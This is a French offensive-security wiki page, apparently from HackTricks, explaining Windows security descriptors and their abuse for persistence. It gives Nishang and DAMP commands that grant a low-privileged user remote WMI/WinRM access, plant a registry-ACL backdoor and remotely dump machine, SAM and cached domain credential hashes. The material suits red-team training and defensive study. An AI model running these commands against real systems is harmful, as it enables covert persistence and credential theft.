# Descripteurs de sécurité

{{#include ../../banners/hacktricks-training.md}}

## Descripteurs de sécurité

Les descripteurs de sécurité Windows contiennent un SID de propriétaire, un SID de groupe principal, une ACL discrétionnaire (DACL) qui contrôle l'accès, ainsi qu'une ACL système (SACL) principalement utilisée pour l'audit. Security Descriptor Definition Language (SDDL) est la représentation textuelle ; une chaîne ACE se présente sous la forme `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

Un descripteur de sécurité stocke l'identité du propriétaire d'un objet sécurisable ainsi que les principaux autorisés ou interdits d'exercer certains droits sur celui-ci. Si un attaquant peut modifier une DACL, il peut accorder à un principal faiblement privilégié des droits qui nécessitent normalement un rôle administratif.

Cela rend les descripteurs modifiés de manière ciblée utiles pour la persistence : le compte reste en dehors des groupes privilégiés évidents tout en conservant l'accès à une surface de gestion particulière. Conservez le descripteur d'origine avant les tests afin de pouvoir supprimer exactement la modification.

### Accès à WMI

Vous pouvez donner à un utilisateur l'autorisation d'**exécuter WMI à distance** [**en utilisant ceci**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup> :
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Accès à WinRM

Accordez à un utilisateur l'accès à un endpoint PowerShell/WinRM distant avec la fonction `Set-RemotePSRemoting` de Nishang :<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Accès distant aux hashes

DAMP peut créer une backdoor registry-ACL qui permet ensuite de récupérer à distance le hash du compte machine, les hashes SAM locaux et les identifiants de domaine mis en cache. Accorder ces droits restreints à un compte autrement ordinaire — en particulier sur un contrôleur de domaine — fournit une persistance puissante sans appartenance à un groupe privilégié.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Consultez [**Silver Tickets**](silver-ticket.md) pour apprendre comment utiliser le hash du compte machine d'un Domain Controller.

## References

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Format des chaînes des descripteurs de sécurité](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
